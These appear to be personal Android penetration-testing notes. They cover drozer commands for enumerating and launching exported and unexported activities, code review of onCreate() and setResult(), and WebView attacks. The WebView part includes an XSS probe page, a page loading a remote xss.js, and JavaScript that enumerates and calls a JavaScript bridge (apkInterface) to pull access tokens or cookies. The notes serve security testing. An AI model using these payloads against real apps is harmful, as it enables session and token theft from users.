Activities are basically the GUI screen that we seen in an android app.

- `run [app.activity.info](http://app.activity.info)-a <package-name>`
    - Don't use the `-u` flag. It's for activity which are not exported.
    - Non-exported activities might also give you something juicy but usually, it requires root permissions.
- start activity is always exported because an application has to be started when someone clicks on the ICON.
    - It have intent filter for the launcher.
- If you want to invoke an activity:
    - `run app.activity.start --component <package-name> <activity-name>`

In addition to provoking any exported activity with drozer, also read the source code and see what is being done with `onCreate()`  method. Because every time activity is called there is an onCreate() method called. So maybe see what they do it with the data(if they accept any) or are there any `if/else` condition that is placed.

Also check if the activity sends any result back. This is done by `setResult()` . So see if there any call to that function and try to find out what's being sent back to the caller.

These are better know as `fragments` . They are just small UI task that kind of help the activities. 

**NOTE**: It's possible to try to provoke the `unexported` activities, because they might give you something. Like say if there is a `SETTING ACTIVITY` which shows you the setting of the application etc. Now that is only to be displayed once the user is logged in but it might be possible to provoke them with having a user to do login.


## Tricks

If any activity allows loading any URL in `webView` then try to read the JS file.

On  server host the following code:

```jsx
<html>
    <head>
        <title>Test</title>
    </head>
    <body>
        <img src='http://<server-url>/img.png' onerror=alert(1)>
    </body>
</html>
```

And then try to run the activity if alert(1) is loaded it's possible that you might see something good as well.

To test if it's possible to read the internal files try the following:

1) Make a file name `xss.html`  with the following code:

```jsx
<html>
    <head>
        <title>Test</title>
    </head>
    <body>
        <h1>Test</h1>
        <script src="http://<url>/xss.js"></script>
    </body>
</html>
```

2) In `xss.js` try with the following code:

```jsx
Object.getOwnPropertyNames(window).forEach(function(v, x) { document.writeln(v); });
```

It should give you loads of functions, scroll to the bottom and see if you have anything like `apkInterface` if yes then you can try the following command:

```jsx
Object.getOwnPropertyNames(window.apkInterface).forEach(function(v, x) { document.writeln(v); });
```

And if this gives some output then try running:

```jsx
document.write(apkInterface.getApkPushParams());
```

This might give you payload that contains access token or any kind of cookies.

Another way of checking is that see if 

- `settings.setJavaScriptEnabled(true);`
- DOM setting is enabled or not, it would look similar to line as javascriptEnabled.
- Also check for `webSettings().setAllowFileAccess(true);`  if it's false then you won't be able to read the files.


* Always look for permissions
